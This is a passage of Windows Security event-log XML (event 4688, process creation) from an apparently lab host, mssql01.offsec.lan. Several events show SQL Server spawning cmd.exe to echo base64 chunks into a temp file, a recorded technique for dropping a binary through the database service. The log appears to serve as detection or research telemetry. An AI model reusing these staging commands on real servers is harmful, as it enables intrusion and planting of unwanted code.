      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:24.510803600Z" />
      <EventRecordID>1331371</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xe74</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo aW9uLCB0aGUgYXR0cmlidXRlcwoAAAAAAAAAICAgICAgICAgICAgICAgICAgICBJbnNlcnRlZCBhZnRlciBhbGwgbm9ybWFsIGhlYWRlciBsaW5lcy4gKHJlcGVhdGFibGUpCgAAAAAAAAAgICAgLUggYXR0cmlidXRlICAgIEFkZCBBcmJpdHJhcnkgaGVhZGVyIGxpbmUsIGVnLiAnQWNjZXB0LUVuY29kaW5nOiBnemlwJwoAAAAAACAgICAtQyBhdHRyaWJ1dGUgICAgQWRkIGNvb2tpZSwgZWcuICdBcGFjaGU9MTIzNC4gKHJlcGVhdGFibGUpCgAgICAgLXogYXR0cmlidXRlcyAgIFN0cmluZyB0byBpbnNlcnQgYXMgdGQgb3IgdGggYXR0cmlidXRlcwoAAAAAICAgIC15IGF0dHJpYnV0ZXMgICBTdHJpbmcgdG8gaW5zZXJ0IGFzIHRyIGF0dHJpYnV0ZXMKAAAgICAgLXggYXR0cmlidXRlcyAgIFN0cmluZyB0byBpbnNlcnQgYXMgdGFibGUgYXR0cmlidXRlcwoAAAAgICAgLWkgICAgICAgICAgICAgIFVzZSBIRUFEIGluc3RlYWQgb2YgR0VUCgAAAAAgICAgLXcgICAgICAgICAgICAgIFByaW50IG91dCByZXN1bHRzIGluIEhUTUwgdGFibGVzCgAAACAgICAtdiB2ZXJib3NpdHkgICAgSG93IG11Y2ggdHJvdWJsZXNob290aW5nIGluZm8gdG8gcHJpbnQKACAgICAgICAgICAgICAgICAgICAgRGVmYXVsdCBpcyAndGV4dC9wbGFpbicKAAAAACAgICAgICAgICAgICAgICAgICAgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcKAAAAACAgICAtVCBjb250ZW50LXR5cGUgQ29udGVudC10eXBlIGhlYWRlciBmb3IgUE9TVGluZywgZWcuCgAAACAgICAtdSBwdXRmaWxlICAgICAgRmlsZSBjb250YWluaW5nIGRhdGEgdG8gUFVULiBSZW1lbWJlciBhbHNvIHRvIHNldCAtVAoAAAAAAAAAICAgIC1wIHBvc3RmaWxlICAgICBGaWxlIGNvbnRhaW5pbmcgZGF0YSB0byBQT1NULiBSZW1lbWJlciBhbHNvIHRvIHNldCAtVAoAACAgICAtYiB3aW5kb3dzaXplICAgU2l6ZSBvZiBUQ1Agc2VuZC9yZWNlaXZlIGJ1ZmZlciwgaW4gYnl0ZXMKAAAgICAgLXQgdGltZWxpbWl0ICAgIFNlY29uZHMgdG8gbWF4LiB3YWl0IGZvciByZXNwb25zZXMKACAgICAtYyBjb25jdXJyZW5jeSAgTnVtYmVyIG9mIG11bHRpcGxlIHJlcXVlc3RzIHRvIG1ha2UKAAAAACAgICAtbiBy&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:24.513854000Z" />
      <EventRecordID>1331372</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x394</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xe74</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:24.790696100Z" />
      <EventRecordID>1331373</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x13c4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo ZXF1ZXN0cyAgICAgTnVtYmVyIG9mIHJlcXVlc3RzIHRvIHBlcmZvcm0KAABPcHRpb25zIGFyZToKAAAAVXNhZ2U6ICVzIFtvcHRpb25zXSBbaHR0cDovL11ob3N0bmFtZVs6cG9ydF0vcGF0aAoAADolZABTU0wgbm90IGNvbXBpbGVkIGluOyBubyBodHRwcyBzdXBwb3J0CgAAaHR0cHM6Ly8AAAAAWyVzXQAAAABodHRwOi8vAGFiOiBDb3VsZCBub3QgcmVhZCBQT1NUIGRhdGEgZmlsZTogJXMKAABhYjogQ291bGQgbm90IGFsbG9jYXRlIFBPU1QgZGF0YSBidWZmZXIKAAAAAGFiOiBDb3VsZCBub3Qgc3RhdCBQT1NUIGRhdGEgZmlsZSAoJXMpOiAlcwoAYWI6IENvdWxkIG5vdCBvcGVuIFBPU1QgZGF0YSBmaWxlICglcyk6ICVzCgBhcHJfZ2xvYmFsX3Bvb2wAJWQuJWQlYwAqKioqAAAAACUzZCVjAAAAJTNkIAAAAAAgIC0gAAAAAEtNR1RQRQAAJXM6IGlsbGVnYWwgb3B0aW9uIC0tICVjCgAAACVzOiBvcHRpb24gcmVxdWlyZXMgYW4gYXJndW1lbnQgLS0gJWMKAABDb21tYW5kTGluZVRvQXJndlcAAGFwcl9pbml0aWFsaXplAAAwMTIzNDU2Nzg5LgAwLjAuMC4wAGJvZ3VzICVwAAAAAEk2NGQAAAAATm8gaG9zdCBkYXRhIG9mIHRoYXQgdHlwZSB3YXMgZm91bmQASG9zdCBub3QgZm91bmQAAEdyYWNlZnVsIHNodXRkb3duIGluIHByb2dyZXNzAAAAV1NBU3RhcnR1cCBub3QgeWV0IGNhbGxlZAAAAFdpbnNvY2sgdmVyc2lvbiBvdXQgb2YgcmFuZ2UAAAAATmV0d29yayBzeXN0ZW0gaXMgdW5hdmFpbGFibGUAAABUb28gbWFueSBsZXZlbHMgb2YgcmVtb3RlIGluIHBhdGgAAABTdGFsZSBORlMgZmlsZSBoYW5kbGUAAABEaXNjIHF1b3RhIGV4Y2VlZGVkAFRvbyBtYW55IHVzZXJzAABUb28gbWFueSBwcm9jZXNzZXMAAERpcmVjdG9yeSBub3QgZW1wdHkATm8gcm91dGUgdG8gaG9zdAAAAABIb3N0IGlzIGRvd24AAAAARmlsZSBuYW1lIHRvbyBsb25nAABUb28gbWFueSBsZXZlbHMgb2Ygc3ltYm9saWMgbGlua3MAAABDb25uZWN0aW9uIHJlZnVzZWQAAENvbm5lY3Rpb24gdGltZWQgb3V0AAAAAFRvbyBtYW55IHJlZmVyZW5jZXMsIGNhbid0IHNwbGljZQAAAENhbid0IHNlbmQgYWZ0ZXIgc29ja2V0IHNodXRkb3duAAAAAFNvY2tldCBpcyBub3QgY29ubmVjdGVk&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:24.792963600Z" />
      <EventRecordID>1331374</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x11a8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x13c4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:25.064454400Z" />
      <EventRecordID>1331375</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x9e8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo AFNvY2tldCBpcyBhbHJlYWR5IGNvbm5lY3RlZABObyBidWZmZXIgc3BhY2UgYXZhaWxhYmxlAAAAQ29ubmVjdGlvbiByZXNldCBieSBwZWVyAAAAAFNvZnR3YXJlIGNhdXNlZCBjb25uZWN0aW9uIGFib3J0AAAAAE5ldCBjb25uZWN0aW9uIHJlc2V0AAAAAE5ldHdvcmsgaXMgdW5yZWFjaGFibGUAAE5ldHdvcmsgaXMgZG93bgBDYW4ndCBhc3NpZ24gcmVxdWVzdGVkIGFkZHJlc3MAAEFkZHJlc3MgYWxyZWFkeSBpbiB1c2UAAEFkZHJlc3MgZmFtaWx5IG5vdCBzdXBwb3J0ZWQAAAAAUHJvdG9jb2wgZmFtaWx5IG5vdCBzdXBwb3J0ZWQAAABPcGVyYXRpb24gbm90IHN1cHBvcnRlZCBvbiBzb2NrZXQAAABTb2NrZXQgdHlwZSBub3Qgc3VwcG9ydGVkAAAAUHJvdG9jb2wgbm90IHN1cHBvcnRlZAAAQmFkIHByb3RvY29sIG9wdGlvbgBQcm90b2NvbCB3cm9uZyB0eXBlIGZvciBzb2NrZXQAAE1lc3NhZ2UgdG9vIGxvbmcAAAAARGVzdGluYXRpb24gYWRkcmVzcyByZXF1aXJlZAAAAABTb2NrZXQgb3BlcmF0aW9uIG9uIG5vbi1zb2NrZXQAAE9wZXJhdGlvbiBhbHJlYWR5IGluIHByb2dyZXNzAAAAT3BlcmF0aW9uIG5vdyBpbiBwcm9ncmVzcwAAAE9wZXJhdGlvbiB3b3VsZCBibG9jawAAAFRvbyBtYW55IG9wZW4gc29ja2V0cwAAAEludmFsaWQgYXJndW1lbnQAAAAAQmFkIGFkZHJlc3MAUGVybWlzc2lvbiBkZW5pZWQAAABCYWQgZmlsZSBudW1iZXIASW50ZXJydXB0ZWQgc3lzdGVtIGNhbGwAQVBSIGRvZXMgbm90IHVuZGVyc3RhbmQgdGhpcyBlcnJvciBjb2RlAEVycm9yIHN0cmluZyBub3Qgc3BlY2lmaWVkIHlldAAAcGFzc3dvcmRzIGRvIG5vdCBtYXRjaAAAVGhpcyBmdW5jdGlvbiBoYXMgbm90IGJlZW4gaW1wbGVtZW50ZWQgb24gdGhpcyBwbGF0Zm9ybQAAAAAAVGhlcmUgaXMgbm8gZXJyb3IsIHRoaXMgdmFsdWUgc2lnbmlmaWVzIGFuIGluaXRpYWxpemVkIGVycm9yIGNvZGUAAABTaGFyZWQgbWVtb3J5IGlzIGltcGxlbWVudGVkIHVzaW5nIGEga2V5IHN5c3RlbQBTaGFyZWQgbWVtb3J5IGlzIGltcGxlbWVudGVkIHVzaW5nIGZpbGVzAAAAAFNoYXJlZCBtZW1vcnkgaXMgaW1wbGVtZW50ZWQgYW5vbnltb3VzbHkAAAAAQ291bGQgbm90IGZpbmQgc3Bl&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:25.066690200Z" />
      <EventRecordID>1331376</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1348</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x9e8</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:25.338263800Z" />
      <EventRecordID>1331377</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x113c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo Y2lmaWVkIHNvY2tldCBpbiBwb2xsIGxpc3QuAAAARW5kIG9mIGZpbGUgZm91bmQAAABNaXNzaW5nIHBhcmFtZXRlciBmb3IgdGhlIHNwZWNpZmllZCBjb21tYW5kIGxpbmUgb3B0aW9uAEJhZCBjaGFyYWN0ZXIgc3BlY2lmaWVkIG9uIGNvbW1hbmQgbGluZQBQYXJ0aWFsIHJlc3VsdHMgYXJlIHZhbGlkIGJ1dCBwcm9jZXNzaW5nIGlzIGluY29tcGxldGUAAFRoZSB0aW1lb3V0IHNwZWNpZmllZCBoYXMgZXhwaXJlZAAAAFRoZSBzcGVjaWZpZWQgY2hpbGQgcHJvY2VzcyBpcyBub3QgZG9uZSBleGVjdXRpbmcAAABUaGUgc3BlY2lmaWVkIGNoaWxkIHByb2Nlc3MgaXMgZG9uZSBleGVjdXRpbmcAAABUaGUgc3BlY2lmaWVkIHRocmVhZCBpcyBub3QgZGV0YWNoZWQAAAAAVGhlIHNwZWNpZmllZCB0aHJlYWQgaXMgZGV0YWNoZWQAAAAAAAAAAFlvdXIgY29kZSBqdXN0IGZvcmtlZCwgYW5kIHlvdSBhcmUgY3VycmVudGx5IGV4ZWN1dGluZyBpbiB0aGUgcGFyZW50IHByb2Nlc3MAAAAAWW91ciBjb2RlIGp1c3QgZm9ya2VkLCBhbmQgeW91IGFyZSBjdXJyZW50bHkgZXhlY3V0aW5nIGluIHRoZSBjaGlsZCBwcm9jZXNzAEludGVybmFsIGVycm9yAABUaGUgcHJvY2VzcyBpcyBub3QgcmVjb2duaXplZC4AAFRoZSBnaXZlbiBwYXRoIGNvbnRhaW5lZCB3aWxkY2FyZCBjaGFyYWN0ZXJzAAAAAFRoZSBnaXZlbiBwYXRoIGlzIG1pc2Zvcm1hdHRlZCBvciBjb250YWluZWQgaW52YWxpZCBjaGFyYWN0ZXJzAABUaGUgZ2l2ZW4gcGF0aCB3YXMgYWJvdmUgdGhlIHJvb3QgcGF0aAAAVGhlIGdpdmVuIHBhdGggaXMgaW5jb21wbGV0ZQAAAABUaGUgZ2l2ZW4gcGF0aCBpcyByZWxhdGl2ZQAAVGhlIGdpdmVuIHBhdGggaXMgYWJzb2x1dGUAAFRoZSBzcGVjaWZpZWQgbmV0d29yayBtYXNrIGlzIGludmFsaWQuAABUaGUgc3BlY2lmaWVkIElQIGFkZHJlc3MgaXMgaW52YWxpZC4AAAAARFNPIGxvYWQgZmFpbGVkAE5vIHNoYXJlZCBtZW1vcnkgaXMgY3VycmVudGx5IGF2YWlsYWJsZQBObyB0aHJlYWQga2V5IHN0cnVjdHVyZSB3YXMgcHJvdmlkZWQgYW5kIG9uZSB3YXMgcmVxdWlyZWQuAABObyB0aHJlYWQgd2FzIHByb3ZpZGVkIGFuZCBvbmUgd2FzIHJlcXVpcmVkLgAAAABO&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:25.341142700Z" />
      <EventRecordID>1331378</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x10bc</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x113c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:25.618320400Z" />
      <EventRecordID>1331379</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x568</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo byBzb2NrZXQgd2FzIHByb3ZpZGVkIGFuZCBvbmUgd2FzIHJlcXVpcmVkLgAAAABObyBwb2xsIHN0cnVjdHVyZSB3YXMgcHJvdmlkZWQgYW5kIG9uZSB3YXMgcmVxdWlyZWQuAAAAAE5vIGxvY2sgd2FzIHByb3ZpZGVkIGFuZCBvbmUgd2FzIHJlcXVpcmVkLgAATm8gZGlyZWN0b3J5IHdhcyBwcm92aWRlZCBhbmQgb25lIHdhcyByZXF1aXJlZC4ATm8gdGltZSB3YXMgcHJvdmlkZWQgYW5kIG9uZSB3YXMgcmVxdWlyZWQuAABObyBwcm9jZXNzIHdhcyBwcm92aWRlZCBhbmQgb25lIHdhcyByZXF1aXJlZC4AAABBbiBpbnZhbGlkIHNvY2tldCB3YXMgcmV0dXJuZWQAAEFuIGludmFsaWQgZGF0ZSBoYXMgYmVlbiBwcm92aWRlZAAAAEEgbmV3IHBvb2wgY291bGQgbm90IGJlIGNyZWF0ZWQuAAAAAFVucmVjb2duaXplZCBXaW4zMiBlcnJvciBjb2RlICVkAAAAAFwAXAA/AFwAVQBOAEMAXAAAAAAAXABcAD8AXAAAAAAAQ2FuY2VsSW8AAAAAR2V0Q29tcHJlc3NlZEZpbGVTaXplQQAAR2V0Q29tcHJlc3NlZEZpbGVTaXplVwAAWndRdWVyeUluZm9ybWF0aW9uRmlsZQAAR2V0U2VjdXJpdHlJbmZvAEdldE5hbWVkU2VjdXJpdHlJbmZvQQAAAEdldE5hbWVkU2VjdXJpdHlJbmZvVwAAAFUATgBDAFwAAAAAAEdldEVmZmVjdGl2ZVJpZ2h0c0Zyb21BY2xXAAAAAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////bnRkbGwuZGxsAAAAc2hlbGwzMgB3czJfMzIAAG1zd3NvY2sAYWR2YXBpMzIAAAAAa2VybmVsMzIAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:25.620993300Z" />
      <EventRecordID>1331380</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x12f4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x568</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
